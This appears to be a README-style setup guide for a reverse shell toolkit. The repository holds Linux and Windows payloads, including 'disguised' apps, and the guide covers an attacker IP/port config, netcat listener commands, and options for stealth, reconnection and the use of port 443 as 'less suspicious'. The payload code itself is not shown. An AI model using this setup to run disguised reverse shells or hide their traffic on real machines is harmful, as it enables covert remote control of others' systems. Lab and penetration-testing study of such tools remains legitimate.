# Configuration Guide for Reverse Shell Scripts

## Overview
This repository now uses a centralized configuration file (`config.py`) to manage IP addresses and ports for all reverse shell scripts. This makes it easier to configure and maintain your testing environment.

## Configuration File Structure

### Location
```
reverse-shell-simple-script/
├── config.py                    # <- Centralized configuration
├── src/
│   ├── linux/
│   │   ├── reverse_shell.py
│   │   └── disguised_app.py
│   └── windows/
│       ├── reverse_shell.py
│       └── disguised_app.py
```

### config.py Content
```python
ATTACKER_IP = "192.168.1.10"    # Your Kali Linux IP address
ATTACKER_PORT = 4444            # Port for reverse shell connection
```

## Setup Instructions

### Step 1: Configure Your Environment
1. **Find your Kali IP address:**
   ```bash
   # On Kali Linux
   ip addr show
   # or
   ifconfig
   ```

2. **Edit config.py:**
   ```bash
   # From the root directory
   nano config.py
   
   # Update with your actual Kali IP
   ATTACKER_IP = "192.168.1.100"  # Example: replace with your IP
   ATTACKER_PORT = 4444           # You can change this port if needed
   ```

### Step 2: Usage with Different Platforms

#### For Linux Testing (Ubuntu VM):
```bash
# Navigate to the repository root
cd /path/to/reverse-shell-simple-script

# Run Linux scripts (they will automatically import config.py)
python3 src/linux/reverse_shell.py
python3 src/linux/disguised_app.py
```

#### For Windows Testing:
```bash
# From repository root
python src/windows/reverse_shell.py
python src/windows/disguised_app.py
```

### Step 3: Set Up Listener on Kali

Before running any payload, start your listener:
```bash
# Basic netcat listener
sudo nc -nlvp 4444

# Or use the port from your config.py
sudo nc -nlvp $(python3 -c "import config; print(config.ATTACKER_PORT)")
```

## Benefits of Centralized Configuration

### 1. Easy Environment Management
- **Single source of truth** for IP/port configuration
- **No need to edit multiple files** when changing network setup
- **Consistent configuration** across all scripts

### 2. Network Flexibility
```python
# Example: Different configurations for different networks

# Home lab
ATTACKER_IP = "192.168.1.100"
ATTACKER_PORT = 4444

# VPN environment
# ATTACKER_IP = "10.0.0.50"
# ATTACKER_PORT = 8080

# Public cloud testing
# ATTACKER_IP = "203.0.113.10"
# ATTACKER_PORT = 443
```

### 3. Advanced Configuration Options
You can extend `config.py` with additional settings:

```python
# Enhanced config.py example
ATTACKER_IP = "192.168.1.100"
ATTACKER_PORT = 4444

# Additional configuration options
RECONNECT_DELAY = 5              # Seconds between reconnection attempts
MAX_RECONNECTS = 10              # Maximum reconnection attempts
STEALTH_MODE = True              # Enable stealth features
DEBUG_MODE = False               # Enable debug logging

# Alternative ports for different scenarios
PORTS = {
    'default': 4444,
    'web': 80,
    'https': 443,
    'dns': 53,
    'alternative': 8080
}

# Target-specific settings
LINUX_SHELL = "/bin/bash"
WINDOWS_SHELL = "cmd.exe"
```

## Troubleshooting

### Common Issues:

#### 1. Import Error
```
ModuleNotFoundError: No module named 'config'
```
**Solution:** Make sure you're running scripts from the repository root or the path to config.py is correct.

```bash
# Correct way - from repository root
cd /path/to/reverse-shell-simple-script
python3 src/linux/reverse_shell.py

# Or add the root path to Python path
export PYTHONPATH="/path/to/reverse-shell-simple-script:$PYTHONPATH"
```

#### 2. Wrong IP Configuration
```
Connection refused
```
**Solution:** Verify your Kali IP address and update config.py

```bash
# Check current IP
ip addr show

# Update config.py with correct IP
nano config.py
```

#### 3. Port Already in Use
```
Address already in use
```
**Solution:** Change the port in config.py or kill the process using the port

```bash
# Find process using port 4444
sudo netstat -tulpn | grep 4444

# Kill the process
sudo kill -9 <PID>

# Or use different port in config.py
ATTACKER_PORT = 4445
```

## Deployment Considerations

### For Lab Testing:
```python
# config.py for isolated lab
ATTACKER_IP = "192.168.1.100"     # Lab network
ATTACKER_PORT = 4444              # Standard port
DEBUG_MODE = True                 # Enable debugging
```

### For Advanced Testing:
```python
# config.py for stealth testing
ATTACKER_IP = "192.168.1.100"
ATTACKER_PORT = 443               # HTTPS port (less suspicious)
STEALTH_MODE = True
RECONNECT_DELAY = 30              # Longer delays
```

### For Multiple Targets:
```python
# config.py with multiple configurations
TARGETS = {
    'ubuntu_vm': {
        'ip': '192.168.1.100',
        'port': 4444
    },
    'windows_vm': {
        'ip': '192.168.1.100', 
        'port': 4445
    }
}

# Use in scripts like:
# ATTACKER_IP = TARGETS['ubuntu_vm']['ip']
# ATTACKER_PORT = TARGETS['ubuntu_vm']['port']
```

## Security Notes

### Configuration File Security:
- **Never commit real IPs** to public repositories
- **Use .gitignore** for sensitive configurations
- **Create example configs** for documentation

### Example .gitignore entry:
```
# Ignore real configuration
config.py

# Keep example configuration
!config.example.py
```

### Example config.example.py:
```python
# Example configuration - copy to config.py and modify
ATTACKER_IP = "YOUR_KALI_IP_HERE"    # Replace with your Kali IP
ATTACKER_PORT = 4444                 # Change if needed

# Additional options (optional)
RECONNECT_DELAY = 5
MAX_RECONNECTS = 10
DEBUG_MODE = False
```

## Quick Reference

### Change IP for all scripts:
```bash
# Edit config.py
nano config.py

# All scripts will automatically use new IP
```

### Use different ports:
```bash
# Edit config.py
ATTACKER_PORT = 8080

# Start listener with new port
sudo nc -nlvp 8080
```

### Test configuration:
```bash
# Quick test
python3 -c "import config; print(f'Target: {config.ATTACKER_IP}:{config.ATTACKER_PORT}')"
```

This centralized configuration approach makes your reverse shell testing more organized, flexible, and easier to manage across different environments.